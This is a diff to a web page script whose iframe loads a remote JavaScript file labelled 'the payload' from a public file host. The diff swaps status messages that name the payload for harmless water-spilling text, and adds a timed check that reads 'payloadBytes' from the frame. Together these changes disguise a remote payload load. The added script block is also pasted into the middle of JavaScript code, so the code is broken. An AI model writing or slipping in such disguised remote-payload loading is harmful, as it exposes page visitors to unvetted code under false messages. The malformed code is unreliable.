@@ -15,12 +15,27 @@
     iframe.onload = () => {
       // Redirects to the payload
       iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
-      document.getElementById("status").textContent = "Payload rerouted via iframe hatch.";
+      document.getElementById("status").textContent = "Spilling 250ml...";
     };
 
     iframe.onerror = () => {
-      document.getElementById("status").textContent = "Iframe navigation failed!";
+      document.getElementById("status").textContent = "Bottle not filled. Try again.";
     };
+
+     <script>
+     setTimeout(() => {
+       try {
+         const result = window.frames[0].payloadBytes;
+         if (result && result instanceof Uint8Array) {
+           document.getElementById("status").textContent = "Water spilled successfully!";
+         } else {
+           document.getElementById("status").textContent = "Nothing's been spilled...";
+         }
+       } catch (e) {
+         document.getElementById("status").textContent = "The glass might have been spilled or not, who knows?";
+       }
+     }, 5000); // Waits a few seconds after loading to let the payload finish
+     </script>
 
     document.body.appendChild(iframe);
   }, 1500);
